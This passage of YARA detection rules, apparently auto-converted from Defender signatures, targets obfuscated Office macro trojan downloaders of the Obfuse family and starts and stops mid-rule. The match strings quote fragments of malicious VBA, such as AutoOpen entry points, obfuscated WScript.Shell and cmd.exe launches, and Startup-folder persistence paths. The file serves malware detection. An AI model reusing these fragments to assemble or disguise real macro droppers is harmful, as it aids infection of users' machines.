        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 [0-34] 28 31 29 29 2e 43 72 65 61 74 65 20 [0-34] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FU_2147740592_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FU"
        threat_id = "2147740592"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {43 61 6c 6c 20 [0-20] 2e 52 75 6e 25 28 20 5f}  //weight: 2, accuracy: Low
        $x_1_3 = "= CreateObject _" ascii //weight: 1
        $x_1_4 = ".Text)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KF_2147740623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KF"
        threat_id = "2147740623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = " = CreateObject(gimme())" ascii //weight: 10
        $x_10_2 = " = iles.getspecialFolDer(2) & \"\\..\\..\\Roaming\\MicrOSOft\\WinDOWs\\StART Menu\\ProGRAms\\StaRTup\"" ascii //weight: 10
        $x_10_3 = " = CreateObject(decode(" ascii //weight: 10
        $x_10_4 = " = CallByName(bbia, eyak(" ascii //weight: 10
        $x_10_5 = " = CallByName(beqo, kzfj(" ascii //weight: 10
        $x_10_6 = ".Get(June(\"106124129070069114099133130118120134134\")).Create " ascii //weight: 10
        $x_10_7 = ".CreateTextFile(Environ(DRTYUIUU(" ascii //weight: 10
        $x_10_8 = ".ShellExecute ed00010000010(BIUFRYGFEUFBBCGD.ProcessName.Text), " ascii //weight: 10
        $x_10_9 = " = Environ$(\"pu\" & \"b\" & \"l\" & \"ic\")" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FV_2147740626_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FV"
        threat_id = "2147740626"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {43 61 6c 6c 20 [0-20] 2e 52 75 6e [0-1] 28 20 5f}  //weight: 2, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-16] 20 3d 20 56 42 41 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FW_2147740673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FW"
        threat_id = "2147740673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 69 6d 20 [0-16] 20 41 73 20 56 61 72 69 61 6e 74 3a 20 [0-16] 20 3d 20 53 70 6c 69 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-22] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
        $x_2_2 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 31 29 29 2e 43 72 65 61 74 65 20 [0-16] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FX_2147740680_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FX"
        threat_id = "2147740680"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-18] 28 [0-20] 29 20 26 20 [0-18] 28 [0-22] 29 29 2e 52 75 6e 20 [0-21] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-18] 2c 20 [0-18] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Call UnhideSheets" ascii //weight: 1
        $x_1_4 = "Sheets(\"Prompt\").Visible = xlSheetVeryHidden" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FY_2147740684_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FY"
        threat_id = "2147740684"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Dim Fkjhdksjjgjksv As String" ascii //weight: 1
        $x_1_3 = "Call sgsdkjabjkajhabvjkhabvlkadnkjanvkjabv" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FZ_2147740712_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FZ"
        threat_id = "2147740712"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Users\\\" & Environ(\"us\" & \"ername\") & \"\\.templates\"" ascii //weight: 1
        $x_1_2 = "= \"e\" & \"x\"" ascii //weight: 1
        $x_1_3 = "= \"System Manager.\" & eeee & \"e\"" ascii //weight: 1
        $x_1_4 = "= CreateObject(sb & \"ch\" & sa & \"le.\" & sg & sn & \"ice\")" ascii //weight: 1
        $x_1_5 = "fso.CreateTextFile(\"C:\\out.txt\")" ascii //weight: 1
        $x_1_6 = "= Base64Decode(b64)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GA_2147740714_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GA"
        threat_id = "2147740714"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 2c 20 [0-37] 2c 20}  //weight: 2, accuracy: Low
        $x_1_2 = "Sub autoopen()" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GB_2147740715_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GB"
        threat_id = "2147740715"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {43 61 6c 6c 20 [0-20] 2e 52 75 6e 25 28 [0-18] 20 2b}  //weight: 2, accuracy: Low
        $x_1_3 = "= VBA. _" ascii //weight: 1
        $x_1_4 = ".Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GC_2147740735_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GC"
        threat_id = "2147740735"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {2e 52 75 6e 40 20 [0-18] 20 5f}  //weight: 2, accuracy: Low
        $x_1_3 = "= VBA. _" ascii //weight: 1
        $x_1_4 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-18] 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GD_2147740742_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GD"
        threat_id = "2147740742"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-33] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-22] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-33] 28 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GE_2147740752_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GE"
        threat_id = "2147740752"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {2e 52 75 6e 21 20 [0-32] 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = "= VBA. _" ascii //weight: 1
        $x_1_4 = ".Text" ascii //weight: 1
        $x_1_5 = {2b 20 76 62 4e 75 6c 6c [0-17] 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GF_2147740755_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GF"
        threat_id = "2147740755"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 2c 20 [0-37] 2c 20}  //weight: 2, accuracy: Low
        $x_1_2 = "Sub autoopen()" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GG_2147740781_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GG"
        threat_id = "2147740781"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 69 6d 20 [0-20] 28 29 20 41 73 20 53 74 72 69 6e 67 3a 20 [0-20] 20 3d 20 [0-21] 28 [0-20] 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-32] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 28 33 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 20 [0-32] 2c 20 [0-20] 28 34 29 2c 20 31 2c 20 [0-20] 28 32 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "& Chr(Int(Chr(Int(0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GH_2147740782_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GH"
        threat_id = "2147740782"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 [0-1] 28 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 [0-1] 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GI_2147740786_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GI"
        threat_id = "2147740786"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-23] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-22] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 28 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 20 [0-20] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GJ_2147740800_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GJ"
        threat_id = "2147740800"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub POLOLS()" ascii //weight: 1
        $x_1_2 = "Function HEHEHEHE()" ascii //weight: 1
        $x_1_3 = "Module1.BIZARD" ascii //weight: 1
        $x_1_4 = "= Shell(l1 & \"/c\" & a11, 0)" ascii //weight: 1
        $x_1_5 = "= \"cmd\" & \".\" & \"exe\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GK_2147740833_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GK"
        threat_id = "2147740833"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 20 2b 20 [0-20] 20 2b 20 [0-16] 29 2e 52 75 6e 24 20 [0-48] 20 2b 20 [0-18] 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = "+ \"pt.S\" + \"hell\"" ascii //weight: 1
        $x_1_4 = "+ \"Wscri\"" ascii //weight: 1
        $x_1_5 = {2a 20 43 53 74 72 28 [0-7] 20 2f 20 53 67 6e 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GL_2147740850_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GL"
        threat_id = "2147740850"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 2e 43 72 65 61 74 65 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = "Sub autoopen()" ascii //weight: 1
        $x_1_3 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GM_2147740892_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GM"
        threat_id = "2147740892"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = ".Create _" ascii //weight: 1
        $x_1_3 = "Sub autoopen()" ascii //weight: 1
        $x_1_4 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GN_2147740905_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GN"
        threat_id = "2147740905"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Polo = \"She\" & \"ll\"" ascii //weight: 1
        $x_1_2 = "Fake = Chr(32) & \"/\" & \"e\" & \":\"" ascii //weight: 1
        $x_1_3 = "= Replace(ThisDocument.FullName, \".docm\", \".rtf\")" ascii //weight: 1
        $x_1_4 = "VBA.CallByName VBA.CreateObject(Polo & \".Application\"), Copy2, VbMethod, \"W\" & Mix2, Fake" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GO_2147740932_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GO"
        threat_id = "2147740932"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {2e 52 75 6e 25 20 28 [0-32] 2e 54 65 78 74 20 5f}  //weight: 2, accuracy: Low
        $x_1_3 = "= VBA. _" ascii //weight: 1
        $x_1_4 = ".Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GP_2147740937_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GP"
        threat_id = "2147740937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-16] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub autoopen()" ascii //weight: 1
        $x_1_4 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GQ_2147740955_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GQ"
        threat_id = "2147740955"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-33] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-33] 28 31 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-33] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_2_3 = {43 61 6c 6c 20 [0-32] 28 53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-7] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 43 68 72 28 [0-2] 29 29 29}  //weight: 2, accuracy: Low
        $x_2_4 = {43 61 6c 6c 20 [0-20] 28 53 70 6c 69 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-39] 29 2e 56 61 6c 75 65 2c 20 43 68 72 28 34 34 29 29 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_GR_2147740984_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GR"
        threat_id = "2147740984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_2_2 = {2e 52 75 6e 21 20 [0-20] 2e 56 61 6c 75 65 20 26 20 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 56 61 6c 75 65 2c}  //weight: 2, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 28 4e 6f 74 20 [0-17] 29 20 4f 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GS_2147741013_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GS"
        threat_id = "2147741013"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {2e 52 75 6e 21 20 [0-20] 2e 56 61 6c 75 65 20 26 20 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 56 61 6c 75 65 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 [0-20] 20 3d 20 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 32 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GT_2147741024_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GT"
        threat_id = "2147741024"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-53] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 31 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-53] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-8] 29 2e 52 61 6e 67 65 28 [0-8] 29 2e 76 61 6c 75 65 2c 20 43 68 72 28 34 34 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 70 6c 69 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-22] 29 2e 76 61 6c 75 65 2c 20 43 68 72 28 34 34 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GU_2147741160_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GU"
        threat_id = "2147741160"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
